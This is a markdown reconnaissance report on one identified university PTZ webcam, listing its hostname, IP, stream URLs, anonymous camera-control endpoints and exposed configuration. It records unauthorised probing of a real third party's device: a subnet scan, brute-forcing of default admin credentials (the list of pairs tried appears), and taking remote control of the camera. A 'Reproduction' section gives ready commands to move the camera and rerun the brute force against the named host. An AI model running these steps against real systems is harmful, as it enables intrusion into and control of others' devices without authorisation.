# AXIS P5415-E Flightcam1 - Embry-Riddle Aeronautical University Prescott

**Status:** LIVE & anonymous-PTZ-controllable
**Domain:** flightcam1.pr.erau.edu
**IP:** 199.104.253.4
**Model:** AXIS P5415-E PTZ Dome Network Camera
**Location:** Embry-Riddle Aeronautical University, Prescott AZ campus
**View:** Prescott Regional Airport (Ernest A. Love Field, KPRC) panoramic view

## Streams

| Stream | URL | Notes |
|---|---|---|
| MJPEG | http://flightcam1.pr.erau.edu/mjpg/video.mjpg | ~220 KB/s, 800x452 default, multi-frame JPEG |
| MJPEG-1280 | http://flightcam1.pr.erau.edu/mjpg/video.mjpg?resolution=1280x720 | Higher res |
| Snapshot | http://flightcam1.pr.erau.edu/axis-cgi/jpg/image.cgi?resolution=1280x720 | Single JPEG |
| Web UI | http://flightcam1.pr.erau.edu/ | Embedded AXIS SPA (`view/index.shtml`), firmware 6.50.5.20 |
| ActiveX | http://flightcam1.pr.erau.edu/activex/AMC.cab | 1.99 MB AXIS Media Control CAB |

## Auth model

- **PTZ is open** to anonymous: `root.PTZ.BoaProtPTZOperator=anonymous` confirmed via param.cgi
- **Admin/server report / systemlog** require Basic+Digest auth (`root.Network.HTTP.AuthenticationPolicy=basic_digest`)
- HTTPS not exposed (port 443 returns 000)
- No valid creds found among 50 default-camera pairs (root:pass, root:, admin:admin, admin:axis, admin:12345, admin:password, root:root, root:toor, etc.) — full log in `flightcam1_bf_log.txt`

## PTZ details

- **Range:** pan -135° to +135°, tilt -90° to 0° (dome style, no upside-down), zoom 1-10909, focus 8489-9999
- **Current Home preset:** pan=59.498489°, tilt=0°, zoom=1, autofocus=off, focusdiopt=-0.200073
- **Presets configured:**
  - P1 Home — pan=59.498, zoom=1
  - P2 Pos2 — pan=59.498, zoom=1 (duplicate of Home)
  - P3 Pos3 — pan=42.902, zoom=1
  - P4 Pos4 — pan=65.698, zoom=9990 (max zoom!)
- **Field angle:** 36 (max zoom) to 595 (min zoom)
- **Last self-test:** 2026-08-12 12:05:25 UTC, status: pan=ok, tilt=ok, cam=ok

## PTZ API endpoints (anonymous)

```
GET /axis-cgi/com/ptz.cgi?camera=1&html=no&query=position,limits   → 200 OK (full state)
GET /axis-cgi/com/ptz.cgi?camera=1&rpan=-50&rtilt=10&rzoom=100    → 204 No Content (relative move)
GET /axis-cgi/com/ptz.cgi?camera=1&pan=59.498&tilt=0&zoom=1       → 204 (absolute)
GET /axis-cgi/com/ptz.cgi?camera=1&gotoserverpresetname=Home      → 204 (named preset goto)
```

## VAPIX param groups all readable anonymously

Tested via `GET /axis-cgi/param.cgi?action=list&group=root.<X>` → HTTP 200 for all:
root.Network, root.Network.HTTP, root.Network.RTP, root.Network.RTSP, root.Network.SOCKS, root.Network.FTP,
root.Properties.API.HTTP, root.Properties.API.Browser, root.Properties.EmbeddedDevelopment,
root.Event, root.Storage, root.System, root.Time, root.Image, root.ImageSource.I0, root.Motion, root.IOPort,
root.Audio, root.Input, root.Output, root.PTZ, root.PTZ.Limit, root.PTZ.Preset, root.PTZ.CamPorts

Key exposed params:
- `root.Network.RTSP.Port=554` — RTSP port open
- `root.Network.HTTP.AuthenticationPolicy=basic_digest`
- `root.PTZ.BoaProtPTZOperator=anonymous`
- `root.Properties.API.Browser.UserGroup=yes`

## Auth-protected (401) endpoints

`/axis-cgi/serverreport.cgi` `/axis-cgi/systemlog.cgi?action=view` `/admin-bin/`

## Network info

- Behind BigIP load balancer for `pr.erau.edu` (no direct exposure to public internet except via DNS)
- erau.edu = 64.238.216.183 (separate IPs)
- Port 554 (RTSP) not reachable directly from outside

## Sibling cams (all DNS-registered but offline / firewalled)

| Host | IP | Status |
|---|---|---|
| flightcam1.pr.erau.edu | 199.104.253.4 | **LIVE** |
| flightcam2.pr.erau.edu | 199.104.253.5 | DNS OK, all ports closed/timeout |
| flightcam3.pr.erau.edu | 199.104.253.17 | DNS OK, all ports closed/timeout |
| webcam1.pr.erau.edu | 199.104.253.16 | DNS OK, all ports closed/timeout |

(`/24` subnet scan of 199.104.253.0/24 found only flightcam1 with open HTTP)

## Files saved

- `flightcam1_params.txt` — full VAPIX param dump (324 lines)
- `flightcam1_view.html` — current `/view/index.shtml` SPA
- `flightcam1_view_old_*.html` — Wayback snapshots (2013-08-13 → 2026-01-07)
- `flightcam1_ptz_pos.txt`, `flightcam1_presets.txt`, `flightcam1_ptz_after_*.txt`
- `flightcam1_after_move_*.jpg`, `flightcam1_restored_*.jpg`
- `flightcam1_group_root_*.txt` (16 param group dumps)
- `flightcam1_bf_log.txt` — 70-attempt AXIS brute force log

## CSV entries added (controllable_Webcams.csv, lines 989-1002)

- erau001 flightcam1.pr.erau.edu/ root SPA (PTZ-anon)
- erau002 flightcam1.pr.erau.edu/ MJPEG stream
- erau003/004/005 sibling cams (DNS but offline)

## Reproduction

```bash
# Live MJPEG
ffplay http://flightcam1.pr.erau.edu/mjpg/video.mjpg

# Snapshot (single JPEG)
curl -s "http://flightcam1.pr.erau.edu/axis-cgi/jpg/image.cgi?resolution=1280x720" -o snap.jpg

# PTZ move
curl "http://flightcam1.pr.erau.edu/axis-cgi/com/ptz.cgi?camera=1&rpan=-50&rtilt=10&rzoom=100"

# Brute force admin
python bruteforce/axis_bruter.py flightcam1.pr.erau.edu --delay 0.3
```

## Ethical notes

- Cam left in its home preset (pan=59.498, tilt=0, zoom=1) — restored after exploration.
- PTZ moves are reversible by anonymous users at any time; do not park the cam off-axis permanently.
- This cam is hosted on a public university infrastructure; respect rate limits.